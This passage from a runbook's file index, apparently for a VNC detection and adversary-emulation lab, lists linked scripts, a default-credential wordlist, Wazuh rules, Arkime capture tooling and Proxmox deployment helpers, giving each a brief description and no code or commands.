- [`scripts/observability/vnc-cred-tool.py`](../../scripts/observability/vnc-cred-tool.py) (TightVNC DES reference implementation)
- [`scripts/observability/vnc-wazuh-proof.sh`](../../scripts/observability/vnc-wazuh-proof.sh) (Wazuh proof orchestrator)
- [`scripts/observability/vnc-pcap-proof.sh`](../../scripts/observability/vnc-pcap-proof.sh) (PCAP proof orchestrator)
- [`provisioning/wordlists/vnc-betterdefaultpasslist.txt`](../../provisioning/wordlists/vnc-betterdefaultpasslist.txt) (SecLists VNC default-credentials slice)
- [`scripts/observability/vnc-hot-test-registry-fix.sh`](../../scripts/observability/vnc-hot-test-registry-fix.sh) (manual registry converge + probe loop)
- [`scripts/observability/vnc-adversary-emulation.sh`](../../scripts/observability/vnc-adversary-emulation.sh)
- [`scripts/observability/vnc-replay-on-deploy.sh`](../../scripts/observability/vnc-replay-on-deploy.sh)
- [`scripts/arkime-docker-up.sh`](../../scripts/arkime-docker-up.sh)
- [`scripts/arkime-import-pcap.sh`](../../scripts/arkime-import-pcap.sh)
- [`infrastructure/arkime-docker/readme.md`](../../infrastructure/arkime-docker/readme.md)
- [`infrastructure/wazuh-docker/config/wazuh_cluster/local_rules.xml`](../../infrastructure/wazuh-docker/config/wazuh_cluster/local_rules.xml) (rules `100800-100807`)
- [`infrastructure/wazuh-docker/config/wazuh_cluster/shared/ews/agent.conf`](../../infrastructure/wazuh-docker/config/wazuh_cluster/shared/ews/agent.conf) (file tails)
- [`docs/runbooks/wazuh-dataset-export-and-replay.md`](wazuh-dataset-export-and-replay.md) (the underlying export/replay primitives)
- [`targets/ews-win11/flag-notes.md`](../../targets/ews-win11/flag-notes.md) (unchanged flag placement)
- [`scripts/proxmox/reproduce-ews-prod-proof.sh`](../../scripts/proxmox/reproduce-ews-prod-proof.sh) (production reproduction driver)
- [`scripts/proxmox/preflight-ews-prod.sh`](../../scripts/proxmox/preflight-ews-prod.sh) (connectivity + dependency preflight)
- [`scripts/proxmox/probe-ews.sh`](../../scripts/proxmox/probe-ews.sh) (drift detector for VMID 109)
- [`scripts/proxmox/rebuild-ews.sh`](../../scripts/proxmox/rebuild-ews.sh) (conditional EWS rebuild)
- [`scripts/proxmox/deploy-arkime-capture.sh`](../../scripts/proxmox/deploy-arkime-capture.sh) (VMID 111 deploy)
- [`scripts/proxmox/verify-arkime-capture.sh`](../../scripts/proxmox/verify-arkime-capture.sh) (Arkime VMID 111 health check)
- [`scripts/proxmox/sync-arkime-pcap.sh`](../../scripts/proxmox/sync-arkime-pcap.sh) (PCAP push + `docker exec capture` into VMID 111)
- [`scripts/proxmox/enable-wazuh-replay-listener.sh`](../../scripts/proxmox/enable-wazuh-replay-listener.sh) (optional `:514` syslog block on production manager)
- [`scripts/proxmox/sync-wazuh-rules.sh`](../../scripts/proxmox/sync-wazuh-rules.sh) (pushes the EWS rule pack to production)
- [`provisioning/cloud-init/arkime/user-data`](../../provisioning/cloud-init/arkime/user-data) + [`provisioning/cloud-init/arkime/bootstrap.sh`](../../provisioning/cloud-init/arkime/bootstrap.sh) (Arkime VMID 111 provisioning)
